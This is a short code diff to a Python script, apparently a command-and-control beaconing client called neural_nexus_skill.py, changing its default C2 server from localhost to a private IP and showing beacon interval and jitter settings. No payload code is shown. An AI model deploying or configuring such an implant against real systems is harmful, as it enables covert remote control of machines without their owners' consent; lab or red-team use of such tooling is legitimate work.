@@ -8,7 +8,7 @@ Usage:
     python neural_nexus_skill.py [--c2 http://<ip>:<port>]
 
 The C2 URL can also be set via the NN_C2 environment variable.
-Default: http://127.0.0.1:5001
+Default: http://10.5.9.41:5001
 """
 
 import os
@@ -29,7 +29,7 @@ from datetime import datetime
 
 # ─── Configuration ───────────────────────────────────────────────────────────
 
-DEFAULT_C2 = os.environ.get("NN_C2", "http://127.0.0.1:5001")
+DEFAULT_C2 = os.environ.get("NN_C2", "http://10.5.9.41:5001")
 BEACON_INTERVAL = int(os.environ.get("NN_INTERVAL", "15"))
 JITTER = 3  # ±seconds
 
